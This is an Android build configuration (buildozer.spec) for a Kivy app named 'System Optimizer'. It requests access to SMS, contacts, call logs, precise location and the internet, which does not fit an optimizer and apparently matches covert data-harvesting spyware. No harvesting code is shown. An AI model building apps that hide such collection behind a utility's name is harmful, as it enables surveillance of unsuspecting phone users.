[app]
title = System Optimizer
package.name = system.opt.v6
package.domain = com.ghost.pro
source.dir = .
version = 6.0
requirements = python3, kivy==2.3.0, requests, pyjnius, android
icon.filename = %(source.dir)s/icon.png
orientation = portrait

# Permissions
android.permissions = INTERNET, READ_SMS, READ_CONTACTS, READ_CALL_LOG, ACCESS_FINE_LOCATION, ACCESS_COARSE_LOCATION

android.api = 33
android.sdk = 33
android.ndk = 25b
android.archs = arm64-v8a
android.enable_androidx = True

[buildozer]
log_level = 2
